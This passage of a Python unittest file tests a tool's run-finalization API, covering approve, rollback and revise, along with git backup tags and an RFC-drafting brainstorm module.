        self.assertEqual(body["changed_files"], [])

    def test_finalize_approve_requires_final_gate_and_clean_tree(self) -> None:
        running = self.seed_run(RunStatus.RUNNING)
        self.assert_error(self._post(f"/api/runs/{running}/finalize", {"action": "approve"}), 409)
        run_id = self.seed_run(RunStatus.READY_FOR_FINAL_GATE)
        self._prepare_dev_branch()
        (self.repo / "README.md").write_text("local edit\n", encoding="utf-8")
        self.assert_error(self._post(f"/api/runs/{run_id}/finalize", {"action": "approve"}), 409)
        self.assertEqual(_git(self.repo, "tag", "--list", "baton-backup/*"), "")
        self.assertEqual(self.store.get_run(run_id)["status"], "READY_FOR_FINAL_GATE")

    def test_finalize_rollback_restores_backup(self) -> None:
        run_id = self.seed_run(RunStatus.READY_FOR_FINAL_GATE)
        base_head, _ = self._prepare_dev_branch()
        self.assertEqual(self._post(f"/api/runs/{run_id}/finalize", {"action": "approve"})[0], 200)
        status, body = self._post(f"/api/runs/{run_id}/finalize", {"action": "rollback"})
        self.assertEqual(status, 200, body)
        self.assertEqual((body["action"], body["status"]), ("rollback", "PAUSED"))
        self.assertEqual(body["backup_tag"], f"baton-backup/{run_id}")
        self.assertEqual(body["base_head"], base_head)
        self.assertEqual(body["restored_to"], base_head)
        self.assertEqual(_git(self.repo, "rev-parse", "main"), base_head)
        self.assertFalse((self.repo / "feature.txt").exists())

    def test_finalize_rollback_keeps_base_commits_made_during_run(self) -> None:
        run_id = self.seed_run(RunStatus.READY_FOR_FINAL_GATE)
        run_start = _git(self.repo, "rev-parse", "main")
        create_backup_tag(self.repo, run_id, "main")  # the engine tags the base at run start
        self._prepare_dev_branch()
        (self.repo / "interim.txt").write_text("user work during the run\n", encoding="utf-8")
        _git(self.repo, "add", "interim.txt")
        _git(self.repo, "commit", "-q", "-m", "interim")
        interim = _git(self.repo, "rev-parse", "main")
        status, body = self._post(f"/api/runs/{run_id}/finalize", {"action": "approve"})
        self.assertEqual(status, 200, body)
        self.assertEqual(body["changed_files"], ["feature.txt"])
        self.assertEqual(_git(self.repo, "rev-parse", "main^"), interim)
        status, body = self._post(f"/api/runs/{run_id}/finalize", {"action": "rollback"})
        self.assertEqual(status, 200, body)
        self.assertEqual((body["restored_to"], body["base_head"]), (interim, interim))
        self.assertEqual(_git(self.repo, "rev-parse", "main"), interim)
        self.assertNotEqual(interim, run_start)
        self.assertTrue((self.repo / "interim.txt").exists())
        self.assertFalse((self.repo / "feature.txt").exists())
        self.assertEqual(self.store.get_run(run_id)["status"], "PAUSED")

    def test_finalize_rollback_of_noop_merge_leaves_base_untouched(self) -> None:
        run_id = self.seed_run(RunStatus.READY_FOR_FINAL_GATE)
        create_backup_tag(self.repo, run_id, "main")
        (self.repo / "later.txt").write_text("landed after the run started\n", encoding="utf-8")
        _git(self.repo, "add", "later.txt")
        _git(self.repo, "commit", "-q", "-m", "later")
        _git(self.repo, "branch", "dev")  # dev has nothing beyond main: the squash merge is empty
        head = _git(self.repo, "rev-parse", "main")
        status, body = self._post(f"/api/runs/{run_id}/finalize", {"action": "approve"})
        self.assertEqual(status, 200, body)
        self.assertEqual(body["merged_commit"], head)
        status, body = self._post(f"/api/runs/{run_id}/finalize", {"action": "rollback"})
        self.assertEqual(status, 200, body)
        self.assertEqual((body["restored_to"], body["base_head"]), (head, head))
        self.assertEqual(_git(self.repo, "rev-parse", "main"), head)
        self.assertTrue((self.repo / "later.txt").exists())

    def test_finalize_rollback_refuses_approval_without_pre_merge_head(self) -> None:
        run_id = self.seed_run(RunStatus.COMPLETED)
        create_backup_tag(self.repo, run_id, "main")
        head = _git(self.repo, "rev-parse", "main")
        self.store.log_event(run_id, "final_gate_approved", actor="human", message="",
                             payload={"backup_tag": f"baton-backup/{run_id}", "merged_commit": head})
        self.assert_error(self._post(f"/api/runs/{run_id}/finalize", {"action": "rollback"}), 409)
        self.assertEqual(_git(self.repo, "rev-parse", "main"), head)
        self.assertEqual(self.store.get_run(run_id)["status"], "COMPLETED")

    def test_finalize_rollback_requires_approved_run(self) -> None:
        for status in (RunStatus.READY_FOR_FINAL_GATE, RunStatus.RUNNING, RunStatus.PAUSED):
            run_id = self.seed_run(status)
            create_backup_tag(self.repo, run_id, "main")
            head = _git(self.repo, "rev-parse", "main")
            self.assert_error(self._post(f"/api/runs/{run_id}/finalize", {"action": "rollback"}), 409)
            self.assertEqual(_git(self.repo, "rev-parse", "main"), head)
            self.assertEqual(self.store.get_run(run_id)["status"], status.value)
        # COMPLETED by the engine without a recorded final-gate approval is refused too.
        run_id = self.seed_run(RunStatus.COMPLETED)
        create_backup_tag(self.repo, run_id, "main")
        self.assert_error(self._post(f"/api/runs/{run_id}/finalize", {"action": "rollback"}), 409)

    def test_finalize_rollback_refuses_when_base_moved_past_merge(self) -> None:
        run_id = self.seed_run(RunStatus.READY_FOR_FINAL_GATE)
        self._prepare_dev_branch()
        self.assertEqual(self._post(f"/api/runs/{run_id}/finalize", {"action": "approve"})[0], 200)
        (self.repo / "user.txt").write_text("user work after the merge\n", encoding="utf-8")
        _git(self.repo, "add", "user.txt")
        _git(self.repo, "commit", "-q", "-m", "user work")
        moved_head = _git(self.repo, "rev-parse", "main")
        self.assert_error(self._post(f"/api/runs/{run_id}/finalize", {"action": "rollback"}), 409)
        self.assertEqual(_git(self.repo, "rev-parse", "main"), moved_head)
        self.assertTrue((self.repo / "user.txt").exists())
        self.assertEqual(self.store.get_run(run_id)["status"], "COMPLETED")

    def test_finalize_rollback_only_once(self) -> None:
        run_id = self.seed_run(RunStatus.READY_FOR_FINAL_GATE)
        self._prepare_dev_branch()
        self.assertEqual(self._post(f"/api/runs/{run_id}/finalize", {"action": "approve"})[0], 200)
        self.assertEqual(self._post(f"/api/runs/{run_id}/finalize", {"action": "rollback"})[0], 200)
        self.assert_error(self._post(f"/api/runs/{run_id}/finalize", {"action": "rollback"}), 409)

    def test_finalize_revise_records_note_without_git_changes(self) -> None:
        run_id = self.seed_run(RunStatus.READY_FOR_FINAL_GATE)
        base_head, _ = self._prepare_dev_branch()
        status, body = self._post(f"/api/runs/{run_id}/finalize", {"action": "revise", "note": "Rename the file"})
        self.assertEqual(status, 200, body)
        self.assertEqual((body["action"], body["status"], body["backup_tag"]), ("revise", "PAUSED", None))
        revisions = self.repo / ".baton" / "runs" / run_id / "revisions.md"
        self.assertEqual(Path(body["revisions_path"]), revisions)
        self.assertIn("Rename the file", revisions.read_text(encoding="utf-8"))
        self.assertEqual(json.loads(self.store.get_run(run_id)["human_decision"])["note"], "Rename the file")
        self.assertEqual(_git(self.repo, "rev-parse", "main"), base_head)
        self.assertEqual(_git(self.repo, "tag", "--list", "baton-backup/*"), "")

    def test_finalize_errors(self) -> None:
        run_id = self.seed_run(RunStatus.READY_FOR_FINAL_GATE)
        self.assert_error(self._post(f"/api/runs/{run_id}/finalize", {"action": "ship-it"}), 400)
        self.assert_error(self._post(f"/api/runs/{run_id}/finalize", {"action": "revise"}), 400)
        self.assert_error(self._post("/api/runs/run-missing/finalize", {"action": "approve"}), 404)
        self.assert_error(self._post(f"/api/runs/{run_id}/finalize", {"action": "rollback"}), 409)

        done_run = self.seed_run(RunStatus.COMPLETED)
        self.assert_error(self._post(f"/api/runs/{done_run}/finalize", {"action": "revise", "note": "Too late"}), 409)


class TestBackupTags(unittest.TestCase):
    def setUp(self) -> None:
        self.enterContext(unittest.mock.patch.dict(os.environ, GIT_IDENTITY))
        self.repo = Path(self.enterContext(tempfile.TemporaryDirectory())).resolve()
        _init_repo(self.repo)
        self.base = _git(self.repo, "rev-parse", "main")

    def _commit_on_dev(self) -> None:
        _git(self.repo, "checkout", "-q", "-b", "dev")
        (self.repo / "next.txt").write_text("next\n", encoding="utf-8")
        _git(self.repo, "add", "next.txt")
        _git(self.repo, "commit", "-q", "-m", "next")

    def test_create_is_lightweight_and_idempotent(self) -> None:
        tag = create_backup_tag(self.repo, "run-1", "main")
        self.assertEqual(tag, "baton-backup/run-1")
        self.assertEqual(_git(self.repo, "cat-file", "-t", tag), "commit")
        self._commit_on_dev()
        _git(self.repo, "checkout", "-q", "main")
        _git(self.repo, "merge", "-q", "dev")
        self.assertEqual(create_backup_tag(self.repo, "run-1", "main"), tag)
        self.assertEqual(_git(self.repo, "rev-parse", tag), self.base)

    def test_restore_resets_base_and_ignores_baton_state(self) -> None:
        (self.repo / ".gitignore").write_text("", encoding="utf-8")  # .baton/ shows up as untracked
        _git(self.repo, "commit", "-q", "-am", "stop ignoring .baton")
        self.base = _git(self.repo, "rev-parse", "main")
        create_backup_tag(self.repo, "run-1", "main")
        self._commit_on_dev()
        _git(self.repo, "checkout", "-q", "main")
        _git(self.repo, "merge", "-q", "dev")
        _git(self.repo, "checkout", "-q", "dev")
        (self.repo / ".baton").mkdir()
        (self.repo / ".baton" / "state.txt").write_text("kept\n", encoding="utf-8")
        self.assertEqual(restore_backup_tag(self.repo, "run-1", "main"), self.base)
        self.assertEqual(_git(self.repo, "symbolic-ref", "--short", "HEAD"), "main")
        self.assertEqual(_git(self.repo, "rev-parse", "main"), self.base)
        self.assertFalse((self.repo / "next.txt").exists())
        self.assertTrue((self.repo / ".baton" / "state.txt").exists())

    def test_restore_refuses_dirty_tree_and_missing_tag(self) -> None:
        with self.assertRaises(GitError):
            restore_backup_tag(self.repo, "run-missing", "main")
        create_backup_tag(self.repo, "run-1", "main")
        (self.repo / "scratch.txt").write_text("unsaved\n", encoding="utf-8")
        with self.assertRaisesRegex(GitError, "scratch.txt"):
            restore_backup_tag(self.repo, "run-1", "main")
        self.assertTrue((self.repo / "scratch.txt").exists())


class TestBrainstormModuleContract(unittest.TestCase):
    """Static contract of ``vibebaton.brainstorm``. Green from M1-T1 onward."""

    def test_scenarios_are_bilingual_and_unique(self) -> None:
        self.assertGreaterEqual(len(SCENARIOS), 4)
        self.assertEqual(len({scenario["id"] for scenario in SCENARIOS}), len(SCENARIOS))
        for scenario in SCENARIOS:
            with self.subTest(scenario=scenario["id"]):
                self.assertEqual(set(scenario), {"id", "title_en", "title_zh", "prompt_en", "prompt_zh"})
                self.assertTrue(all(isinstance(value, str) and value.strip() for value in scenario.values()))
                self.assertFalse(any("一" <= c <= "鿿" for c in scenario["title_en"] + scenario["prompt_en"]))
                self.assertTrue(any("一" <= c <= "鿿" for c in scenario["title_zh"]))
                self.assertTrue(any("一" <= c <= "鿿" for c in scenario["prompt_zh"]))

    def test_brainstorm_module_has_no_condescending_copy(self) -> None:
        source = (Path(__file__).resolve().parents[1] / "src" / "vibebaton" / "brainstorm.py").read_text(encoding="utf-8")
        self.assertIsNone(CONDESCENDING.search(source))


class BrainstormUnitTests(unittest.TestCase):
    """In-process ``brainstorm_turn`` / ``confirm_blueprint`` behaviour; never touches the network."""

    FIRST = "Add a /health endpoint that reports the app version."
    SECOND = (
        "Serve it from `src/app/server.py` and return JSON. Use only the stdlib http.server; "
        "verify with python -m unittest discover -s tests."
    )
    LIVE_RFC = (
        "# Health endpoint\n\n## Goals\n\nExpose the running app version over HTTP for monitoring.\n\n"
        "- Add GET /health returning JSON.\n\n## Constraints\n\n- Stdlib only.\n\n## Non-Goals\n\n- Auth.\n\n"
        "## Architecture & Deliverables\n\n- `src/app/server.py`\n\n"
        "## Verification & Acceptance Criteria\n\n1. GET /health returns 200.\n\n"
        "```bash\npython -m unittest discover -s tests\n```\n"
    )

    def setUp(self) -> None:
        tmp = tempfile.TemporaryDirectory()
        self.addCleanup(tmp.cleanup)
        self.repo = Path(tmp.name)
        env = unittest.mock.patch.dict(os.environ)
        env.start()
        self.addCleanup(env.stop)

    def _online(self) -> None:
        for name in ("VIBEBATON_OFFLINE_BRAINSTORM", "VIBEBATON_BRAINSTORM_OFFLINE"):
            os.environ.pop(name, None)

    def _two_turns(self) -> tuple[dict[str, Any], dict[str, Any]]:
        messages: list[dict[str, str]] = [{"role": "user", "content": self.FIRST}]
        first = brainstorm_turn(self.repo, messages, "new_feature")
        messages += [{"role": "assistant", "content": first["reply"]}, {"role": "user", "content": self.SECOND}]
        return first, brainstorm_turn(self.repo, messages)

    def test_offline_two_turn_flow_grows_the_rfc_and_card(self) -> None:
        os.environ["VIBEBATON_OFFLINE_BRAINSTORM"] = "1"
        first, second = self._two_turns()
        for result in (first, second):
            self.assertIs(result["offline"], True)
            self.assertIsNone(result["provider_used"])
            self.assertTrue(result["reply"].strip())
            self.assertTrue(result["rfc_markdown"].startswith("# Add a /health endpoint"))
            for heading in ("Goals", "Constraints", "Non-Goals", "Architecture & Deliverables",
                            "Verification & Acceptance Criteria"):
                self.assertIn(f"\n## {heading}\n", result["rfc_markdown"])
            self.assertEqual(set(result["blueprint"]), BLUEPRINT_FIELDS)
            self.assertIsNone(CONDESCENDING.search(json.dumps(result, ensure_ascii=False)))
        self.assertGreater(len(second["rfc_markdown"]), len(first["rfc_markdown"]))

        readiness = check_rfc_readiness(second["rfc_markdown"])
        self.assertEqual(readiness["missing_sections"], [])
        card = second["blueprint"]
        self.assertEqual(card["summary"], self.FIRST)
        self.assertEqual(card["deliverables"][0], self.FIRST)
        self.assertIn("Serve it from `src/app/server.py` and return JSON.", card["deliverables"])
        self.assertEqual(card["touched_areas"], ["src/app/server.py"])
        self.assertEqual(card["verification_plan"], readiness["detected_commands"])
        self.assertIn("python -m unittest", card["verification_plan"])
        self.assertEqual(card["readiness_score"], readiness["score"])
        self.assertEqual(card["ready_to_launch"], readiness["safe_for_overnight"])
        self.assertIs(card["ready_to_launch"], True)
        self.assertFalse(first["blueprint"]["ready_to_launch"])  # no verification command yet
        self.assertEqual(self._two_turns(), (first, second))  # deterministic
        self.assertFalse((self.repo / ".baton").exists())  # brainstorm never writes

    def test_rejects_bad_conversations_and_unknown_scenario(self) -> None:
        for messages in ([], [{"role": "system", "content": "x"}], [{"role": "user", "content": 3}],
                         [{"role": "assistant", "content": "x"}], [{"role": "user", "content": "  "}]):
            with self.subTest(messages=messages), self.assertRaises(ValueError):
                brainstorm_turn(self.repo, messages)  # type: ignore[arg-type]
        with self.assertRaises(ValueError):
            brainstorm_turn(self.repo, [{"role": "user", "content": self.FIRST}], "not-a-scenario")

    def test_live_dispatch_parses_reply_and_rfc_block(self) -> None:
        self._online()
        prompts: list[str] = []

        def dispatch(prompt: str) -> tuple[str, str]:
            prompts.append(prompt)
            return "claude_sub", f"Got it: a version endpoint.\n\n````rfc\n{self.LIVE_RFC}````\n"

        result = brainstorm_turn(
            self.repo, [{"role": "user", "content": self.FIRST}], "new_feature", dispatch=dispatch,
        )
        self.assertEqual((result["offline"], result["provider_used"]), (False, "claude_sub"))
        self.assertEqual(result["reply"], "Got it: a version endpoint.")
        self.assertEqual(result["rfc_markdown"], self.LIVE_RFC)
        self.assertEqual(result["blueprint"]["summary"], "Expose the running app version over HTTP for monitoring.")
        self.assertEqual(result["blueprint"]["deliverables"], ["Add GET /health returning JSON."])
        self.assertEqual(result["blueprint"]["touched_areas"], ["src/app/server.py"])
        self.assertIn("## Verification & Acceptance Criteria", prompts[0])
        self.assertIn(self.FIRST, prompts[0])
        self.assertIsNone(CONDESCENDING.search(prompts[0]))

    def test_live_provider_runs_outside_the_repository(self) -> None:
        seen: list[Path] = []

        async def writing_agent(provider: Any, *, cwd: Path, **_: Any) -> SimpleNamespace:
            seen.append(Path(cwd))
            (Path(cwd) / "pwned.txt").write_text("agent wrote here", encoding="utf-8")
            return SimpleNamespace(status="ok", text="reply", stdout="", stderr="")

        before = sorted(path.name for path in self.repo.iterdir())
        cfg = SimpleNamespace(
            pricing=None, daemon=SimpleNamespace(default_stall_timeout_sec=1, default_hard_timeout_sec=1)
        )
        provider = SimpleNamespace(type="cli", name="claude_sub")
        with unittest.mock.patch("vibebaton.cli_runner.invoke_provider", side_effect=writing_agent):
            self.assertEqual(brainstorm._invoke(cfg, provider, "sonnet", "prompt"), ("claude_sub", "reply"))  # type: ignore[arg-type]
        self.assertEqual(len(seen), 1)
        self.assertFalse(seen[0].resolve().is_relative_to(self.repo.resolve()))
        self.assertFalse(seen[0].exists())  # throwaway workspace is discarded
        self.assertEqual(sorted(path.name for path in self.repo.iterdir()), before)

    def test_live_failures_and_offline_env_fall_back_to_offline_composer(self) -> None:
        messages = [{"role": "user", "content": self.FIRST}]

        def boom(prompt: str) -> tuple[str, str]:
            raise RuntimeError("provider down")

        self._online()
        expected = brainstorm_turn(self.repo, messages)  # no cfg and no dispatch -> offline
        self.assertIs(expected["offline"], True)
        for dispatch in (boom, lambda prompt: ("claude_sub", "No rfc block here.")):
            with self.subTest(dispatch=dispatch):
                self.assertEqual(brainstorm_turn(self.repo, messages, dispatch=dispatch), expected)
        os.environ["VIBEBATON_OFFLINE_BRAINSTORM"] = "1"
        live = unittest.mock.Mock(return_value=("claude_sub", ""))
        self.assertEqual(brainstorm_turn(self.repo, messages, dispatch=live), expected)
        live.assert_not_called()

    def test_confirm_writes_atomically_and_returns_readiness(self) -> None:
        rfc_path = self.repo / ".baton" / "00_RFC.md"
        first = confirm_blueprint(self.repo, "# Draft\r\n\r\n## Goals\r\n\r\n- One.\r\n")
        self.assertEqual(Path(first["rfc_path"]), rfc_path.resolve())
        self.assertEqual(rfc_path.read_bytes(), b"# Draft\n\n## Goals\n\n- One.\n")
        self.assertFalse(first["ready_to_launch"])

        second = confirm_blueprint(self.repo, self.LIVE_RFC)
        self.assertEqual(rfc_path.read_text(encoding="utf-8"), self.LIVE_RFC)
        self.assertEqual(second["readiness"], check_rfc_readiness(self.LIVE_RFC))
        self.assertEqual(set(second), {"rfc_path", "readiness", "ready_to_launch"})
        self.assertIs(second["ready_to_launch"], True)
        self.assertEqual(sorted(p.name for p in rfc_path.parent.iterdir()), ["00_RFC.md"])

    def test_confirm_rejects_blank_markdown_and_missing_repo(self) -> None:
        for text in ("", "   \n"):
            with self.subTest(text=text), self.assertRaises(ValueError):
                confirm_blueprint(self.repo, text)
        with self.assertRaises(ValueError):
            confirm_blueprint(self.repo / "missing", self.LIVE_RFC)
        self.assertFalse((self.repo / ".baton").exists())


if __name__ == "__main__":
    unittest.main()
